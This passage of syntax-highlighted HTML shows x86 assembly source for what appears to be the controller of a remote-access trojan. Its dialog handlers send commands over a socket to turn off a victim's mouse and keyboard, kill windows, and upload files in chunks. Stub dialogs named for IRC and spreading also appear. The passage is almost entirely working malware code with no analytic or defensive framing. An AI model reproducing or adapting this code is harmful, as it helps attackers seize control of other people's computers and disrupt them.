    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'121!'</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">

</span><span class="sc5">cmd1_loop4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd1_loop4</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">','</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    
</span><span class="sc5">cmd4_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd4_loop</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">movef_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'021!'</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">

</span><span class="sc5">cmd21_loop24</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd21_loop24</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">','</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    
</span><span class="sc5">cmd14_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd14_loop</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">mouseoff_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mouse_off</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">keyboardoff_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_off</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">killwindows_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_window</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">upload_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'321!'</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">

</span><span class="sc5">cmd14_loop44</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd14_loop44</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_open?</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skip_open</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;        push    NULL</span><span class="sc0">
</span><span class="sc1">;        push    [fhandle]</span><span class="sc0">
</span><span class="sc1">;        call    GetFileSize</span><span class="sc0">

</span><span class="sc1">;        xchg    eax,ecx</span><span class="sc0">
</span><span class="sc1">;        jecxz   u_v_f</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">file_open?</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">skip_open</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">','</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16000</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">IO_Bytes_Count</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">fhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16000</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">send_repeat</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">send_file_complete</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">send_repeat</span><span class="sc0"> 

    
    
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">msgbox_</span><span class="sc0">
    

</span><span class="sc5">send_file_complete</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">error_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">send_c</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sockhandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Main_Dialog</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">Main_Dialog</span><span class="sc0">

</span><span class="sc5">irc_d</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hwnd2</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wmsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_CLOSE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">irc_end</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc5">WM_COMMAND</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">irc_command</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
</span><span class="sc5">irc_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">irc_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EndDialog</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">        
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">irc_finish</span><span class="sc0">

</span><span class="sc5">irc_command</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_IRC_CANCEL</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">irc_end</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">irc_finish</span><span class="sc0">


</span><span class="sc5">irc_d</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">irc_d</span><span class="sc0">

</span><span class="sc5">spread_d</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hwnd2</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wmsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc5">WM_COMMAND</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">spread_command</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_CLOSE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">spread_end</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
</span><span class="sc5">spread_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">spread_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EndDialog</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">        
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">spread_finish</span><span class="sc0">

</span><span class="sc5">spread_command</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_SPREAD_CANCEL</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">spread_end</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">spread_finish</span><span class="sc0">


</span><span class="sc5">spread_d</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">spread_d</span><span class="sc0">

